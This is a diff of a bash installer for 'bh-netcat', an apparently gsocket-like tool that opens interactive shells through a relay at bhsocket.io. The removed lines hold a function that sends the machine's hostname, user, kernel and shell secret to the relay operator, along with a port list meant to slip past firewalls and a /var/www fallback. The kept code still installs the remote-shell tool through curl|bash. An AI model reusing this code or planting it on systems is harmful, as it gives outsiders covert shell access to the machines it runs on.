@@ -3,40 +3,16 @@ set -euo pipefail
 
 BH_HOST="${BH_HOST:-bhsocket.io}"
 BH_PORT="${BH_PORT:-443}"
-BH_PORTS="${BH_PORTS:-${BH_PORT} 7350 53 25 67 8080}"
 BH_BASE_URL="${BH_BASE_URL:-https://bhsocket.io}"
 BH_NAME="bh-netcat"
 BH_TMP=""
-BH_SECRET="${S:-${X:-}}"
 
-say() {
-  printf '%s\n' "$*"
-}
-
-step() {
-  printf '%-70s' "--> $*"
-}
-
-ok() {
-  printf '[OK]\n'
-}
-
-failed() {
-  printf '[FAILED]\n'
-}
-
-skipping() {
-  printf '[SKIPPING]\n'
-}
-
-fail() {
-  printf 'bh-netcat install failed: %s\n' "$*" >&2
-  exit 1
-}
-
-need() {
-  command -v "$1" >/dev/null 2>&1 || fail "missing required command: $1"
-}
+say() { printf '%s\n' "$*"; }
+step() { printf '%-70s' "--> $*"; }
+ok() { printf '[OK]\n'; }
+failed() { printf '[FAILED]\n'; }
+fail() { printf 'bh-netcat install failed: %s\n' "$*" >&2; exit 1; }
+need() { command -v "$1" >/dev/null 2>&1 || fail "missing required command: $1"; }
 
 pick_prefix() {
   if [[ -n "${BH_PREFIX:-}" ]]; then
@@ -44,12 +20,24 @@ pick_prefix() {
     return
   fi
 
+  local dir home_dir
+  IFS=':' read -r -a path_dirs <<<"${PATH:-}"
+  for dir in "${path_dirs[@]}"; do
+    case "$dir" in
+      /opt/homebrew/bin|/usr/local/bin|/usr/bin)
+        if [[ -d "$dir" && -w "$dir" && -x "$dir" ]]; then
+          printf '%s\n' "${dir%/bin}"
+          return
+        fi
+        ;;
+    esac
+  done
+
   if [[ "$(id -u)" = "0" ]]; then
     printf '/usr/local\n'
     return
   fi
 
-  local home_dir candidate path_dir uid
   home_dir="${HOME:-}"
   if [[ -z "$home_dir" ]]; then
     home_dir="$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6 || true)"
@@ -57,34 +45,8 @@ pick_prefix() {
   if [[ -z "$home_dir" ]]; then
     home_dir="$(cd ~ 2>/dev/null && pwd || true)"
   fi
-  if [[ -z "$home_dir" ]]; then
-    home_dir="/var/www"
-    printf '%s\n' "--> WARNING: HOME not set. Using 'HOME=${home_dir}'" >&2
-  fi
-
-  candidate="${home_dir}/.local"
-  if mkdir -p "${candidate}/bin" "${candidate}/lib/bhsocket" 2>/dev/null && [[ -w "${candidate}/bin" && -w "${candidate}/lib/bhsocket" ]]; then
-    printf '%s\n' "$candidate"
-    return
-  fi
-
-  IFS=':' read -r -a bh_path_dirs <<<"${PATH:-}"
-  for path_dir in "${bh_path_dirs[@]}"; do
-    [[ -n "$path_dir" && -d "$path_dir" && -w "$path_dir" && -x "$path_dir" ]] || continue
-    candidate="${path_dir%/}/.."
-    candidate="$(cd "$candidate" 2>/dev/null && pwd || true)"
-    [[ -n "$candidate" ]] || continue
-    if mkdir -p "${candidate}/bin" "${candidate}/lib/bhsocket" 2>/dev/null && [[ -w "${candidate}/bin" && -w "${candidate}/lib/bhsocket" ]]; then
-      printf '%s\n' "$candidate"
-      return
-    fi
-  done
-
-  uid="$(id -u)"
-  candidate="/tmp/bhsocket-${uid}"
-  printf '%s\n' "--> WARNING: ${home_dir}/.local is not writeable. Using '${candidate}'" >&2
-  mkdir -p "${candidate}/bin" "${candidate}/lib/bhsocket" 2>/dev/null || fail "set BH_PREFIX= to a writeable and executable directory"
-  printf '%s\n' "$candidate"
+  [[ -n "$home_dir" ]] || fail "HOME is not set; set BH_PREFIX= to an install directory"
+  printf '%s\n' "${home_dir}/.local"
 }
 
 detect_package() {
@@ -93,33 +55,19 @@ detect_package() {
   arch="$(uname -m | tr '[:upper:]' '[:lower:]')"
 
   case "$os:$arch" in
-    linux:x86_64|linux:amd64)
-      printf 'bh-netcat_x86_64-linux.tar.gz\n'
-      ;;
-    linux:aarch64|linux:arm64)
-      printf 'bh-netcat_aarch64-linux.tar.gz\n'
-      ;;
-    linux:armv6l|linux:armv7l|linux:arm)
-      printf 'bh-netcat_arm-linux.tar.gz\n'
-      ;;
-    darwin:x86_64)
-      printf 'bh-netcat_x86_64-osx.tar.gz\n'
-      ;;
-    darwin:aarch64|darwin:arm64)
-      printf 'bh-netcat_aarch64-osx.tar.gz\n'
-      ;;
-    mingw*:x86_64|msys*:x86_64|cygwin*:x86_64)
-      printf 'bh-netcat_x86_64-cygwin.tar.gz\n'
-      ;;
-    *)
-      fail "unsupported platform: ${os}/${arch}"
-      ;;
+    linux:x86_64|linux:amd64) printf 'bh-netcat_x86_64-linux.tar.gz\n' ;;
+    linux:aarch64|linux:arm64) printf 'bh-netcat_aarch64-linux.tar.gz\n' ;;
+    linux:armv6l|linux:armv7l|linux:arm) printf 'bh-netcat_arm-linux.tar.gz\n' ;;
+    darwin:x86_64) printf 'bh-netcat_x86_64-osx.tar.gz\n' ;;
+    darwin:aarch64|darwin:arm64) printf 'bh-netcat_aarch64-osx.tar.gz\n' ;;
+    mingw*:x86_64|msys*:x86_64|cygwin*:x86_64) printf 'bh-netcat_x86_64-cygwin.tar.gz\n' ;;
+    *) fail "unsupported platform: ${os}/${arch}" ;;
   esac
 }
 
 package_label() {
   case "$1" in
-    bh-netcat_x86_64-linux.tar.gz) printf 'x86_64-alpine\n' ;;
+    bh-netcat_x86_64-linux.tar.gz) printf 'x86_64-linux\n' ;;
     bh-netcat_aarch64-linux.tar.gz) printf 'aarch64-linux\n' ;;
     bh-netcat_arm-linux.tar.gz) printf 'arm-linux\n' ;;
     bh-netcat_x86_64-osx.tar.gz) printf 'x86_64-osx\n' ;;
@@ -130,11 +78,11 @@ package_label() {
 }
 
 write_wrapper() {
-  local bin_path="$1" real_path="$2" selected_port="$3"
-  cat >"$bin_path" <<EOF
+  local bin_path="$1" real_path="$2"
+  cat >"$bin_path" <<EOF_WRAPPER
 #!/usr/bin/env bash
 BH_SOCKET_HOST="\${BH_SOCKET_HOST:-${BH_HOST}}"
-BH_SOCKET_PORT="\${BH_SOCKET_PORT:-${selected_port}}"
+BH_SOCKET_PORT="\${BH_SOCKET_PORT:-${BH_PORT}}"
 BH_REAL="\${BH_REAL:-${real_path}}"
 
 if [[ ! -x "\$BH_REAL" ]]; then
@@ -161,40 +109,8 @@ if [[ -n "\${BASH_VERSION:-}" ]]; then
 fi
 
 exec "\$BH_REAL" "\$@"
-EOF
+EOF_WRAPPER
   chmod 0755 "$bin_path"
-}
-
-json_escape() {
-  printf '%s' "${1:-}" | sed 's/\\/\\\\/g; s/"/\\"/g; s/	/ /g'
-}
-
-report_install() {
-  local bin_path="$1" selected_port="$2" secret="$3" host user os arch kernel payload endpoint
-  endpoint="${BH_BASE_URL%/}/api/install-report"
-  host="$(hostname 2>/dev/null || uname -n 2>/dev/null || true)"
-  user="$(id -un 2>/dev/null || whoami 2>/dev/null || true)"
-  os="$(uname -s 2>/dev/null || true)"
-  arch="$(uname -m 2>/dev/null || true)"
-  kernel="$(uname -r 2>/dev/null || true)"
-  payload="$(printf '{"hostname":"%s","user":"%s","os":"%s","arch":"%s","kernel":"%s","install_path":"%s","relay_port":"%s","secret":"%s","version":"%s"}' \
-    "$(json_escape "$host")" \
-    "$(json_escape "$user")" \
-    "$(json_escape "$os")" \
-    "$(json_escape "$arch")" \
-    "$(json_escape "$kernel")" \
-    "$(json_escape "$bin_path")" \
-    "$(json_escape "$selected_port")" \
-    "$(json_escape "$secret")" \
-    "bash-installer")"
-
-  if command -v curl >/dev/null 2>&1; then
-    curl -fsS -m 5 -H 'content-type: application/json' -d "$payload" "$endpoint" >/dev/null 2>&1 || true
-    return
-  fi
-  if command -v wget >/dev/null 2>&1; then
-    wget -q -T 5 --header='content-type: application/json' --post-data="$payload" -O /dev/null "$endpoint" >/dev/null 2>&1 || true
-  fi
 }
 
 download() {
@@ -203,23 +119,11 @@ download() {
     curl -fsSL "$url" -o "$out"
     return
   fi
-
   if command -v wget >/dev/null 2>&1; then
     wget -qO "$out" "$url"
     return
   fi
-
   fail "missing required command: curl or wget"
-}
-
-remove_install() {
-  local prefix="$1"
-  rm -f "${prefix}/bin/${BH_NAME}"
-  rm -f "${prefix}/lib/bhsocket/${BH_NAME}.real"
-  if [[ "$(id -u)" = "0" && -L "/usr/bin/${BH_NAME}" ]]; then
-    rm -f "/usr/bin/${BH_NAME}"
-  fi
-  say "Removed ${prefix}/bin/${BH_NAME}"
 }
 
 cleanup() {
@@ -228,19 +132,30 @@ cleanup() {
   fi
 }
 
+remove_install() {
+  local prefix="$1"
+  rm -f "${prefix}/bin/${BH_NAME}"
+  rm -f "${prefix}/lib/bhsocket/${BH_NAME}.real"
+  if [[ -L "/usr/bin/${BH_NAME}" ]]; then
+    rm -f "/usr/bin/${BH_NAME}"
+  fi
+  say "Removed ${prefix}/bin/${BH_NAME}"
+}
+
 install_client() {
-  local prefix="$1" package tmp archive extracted real_path bin_path lib_path generated_secret test_log test_ret selected_port port
+  local prefix="$1" package tmp archive extracted bin_path lib_path real_path
   package="$(detect_package)"
-  say "--> Trying $(package_label "$package")"
+  say "--> Installing ${BH_NAME} for $(package_label "$package")"
+
   tmp="$(mktemp -d)"
   BH_TMP="$tmp"
   trap cleanup EXIT
-
   archive="${tmp}/${package}"
-  step "Downloading binaries"
+
+  step "Downloading binary"
   if download "${BH_BASE_URL%/}/bin/${package}" "$archive"; then ok; else failed; return 1; fi
 
-  step "Unpacking binaries"
+  step "Unpacking binary"
   if tar -xzf "$archive" -C "$tmp"; then ok; else failed; return 1; fi
 
   extracted="$(find "$tmp" -type f -perm -111 ! -name "${package}" | head -n 1)"
@@ -250,72 +165,22 @@ install_client() {
   lib_path="${prefix}/lib/bhsocket"
   real_path="${lib_path}/${BH_NAME}.real"
 
-  mkdir -p "$prefix/bin" "$lib_path"
-  step "Copying binaries"
-  if install -m 0755 "$extracted" "$real_path"; then ok; else failed; return 1; fi
+  mkdir -p "${prefix}/bin" "$lib_path"
+  step "Installing command"
+  if install -m 0755 "$extracted" "$real_path" && write_wrapper "$bin_path" "$real_path"; then ok; else failed; return 1; fi
 
-  write_wrapper "$bin_path" "$real_path" "$BH_PORT"
-
-  if [[ "$(id -u)" = "0" && "$prefix" = "/usr/local" && -d /usr/bin && -w /usr/bin ]]; then
-    if [[ ! -e /usr/bin/${BH_NAME} || -L /usr/bin/${BH_NAME} ]]; then
-      ln -sfn "$bin_path" "/usr/bin/${BH_NAME}"
-    fi
-  fi
-
-  step "Testing binaries"
-  if generated_secret="$("$bin_path" -g)"; then ok; else failed; return 1; fi
-  if [[ -z "$BH_SECRET" ]]; then
-    BH_SECRET="$generated_secret"
-  fi
-
-  step "Testing BH Socket Relay Network"
-  selected_port=""
-  for port in $BH_PORTS; do
-    set +e
-    test_log="$(BH_SOCKET_PORT="$port" _GSOCKET_SERVER_CHECK_SEC=15 "$bin_path" -s "$BH_SECRET" -t 2>&1)"
-    test_ret=$?
-    set -e
-    case "$test_ret" in
-      61)
-        selected_port="$port"
-        break
-        ;;
-      0)
-        selected_port="$port"
-        break
-        ;;
-    esac
-  done
-  if [[ -z "$selected_port" ]]; then
-    failed
-    [[ -n "${test_log:-}" ]] && printf '%s\n' "$test_log" >&2
-    fail "Cannot connect to BH Socket relay on tested ports: ${BH_PORTS}"
-  fi
-  write_wrapper "$bin_path" "$real_path" "$selected_port"
-  ok
-  say "--> Relay port selected: ${selected_port}"
-
-  step "Registering install"
-  report_install "$bin_path" "$selected_port" "$BH_SECRET"
-  ok
+  step "Testing command"
+  if "$bin_path" -h >/dev/null 2>&1; then ok; else failed; return 1; fi
 
   say "--> Installed ${bin_path}"
-  say "--> Command path: ${bin_path}"
+  say "--> Relay default: ${BH_HOST}:${BH_PORT}"
   if [[ "$(command -v "$BH_NAME" 2>/dev/null || true)" != "$bin_path" ]]; then
     say "--> Add ${prefix}/bin to PATH if ${BH_NAME} is not found in a new shell."
   fi
   say ""
   say "--> To uninstall use BH_UNINSTALL=1 bash -c \"\$(curl -fsSL ${BH_BASE_URL%/}/install)\""
-  say "--> Basic usage:"
-  say "--> SECRET=\"\$(${BH_NAME} -g)\""
-  say "--> ${BH_NAME} -s \"\$SECRET\" -l -i"
-  say "--> ${BH_NAME} -s \"\$SECRET\" -i"
-  say ""
-  say "--> To reuse this generated secret:"
-  say "--> ${BH_NAME} -s \"${BH_SECRET}\" -l -i"
-  say "--> ${BH_NAME} -s \"${BH_SECRET}\" -i"
-  say "--> S=\"${BH_SECRET}\" bash -c \"\$(curl -fsSL ${BH_BASE_URL%/}/install)\""
-  say "--> S=\"${BH_SECRET}\" bash -c \"\$(wget -qO- ${BH_BASE_URL%/}/install)\""
+  say "--> Test: ${BH_NAME} -h"
+  say "--> Connect: ${BH_NAME} -s \"SECRET_FROM_DEPLOY\" -i"
 }
 
 main() {
@@ -325,8 +190,6 @@ main() {
   need install
   need mktemp
   need id
-
-  cd "${TMPDIR:-/tmp}" 2>/dev/null || true
 
   local prefix
   prefix="$(pick_prefix)"
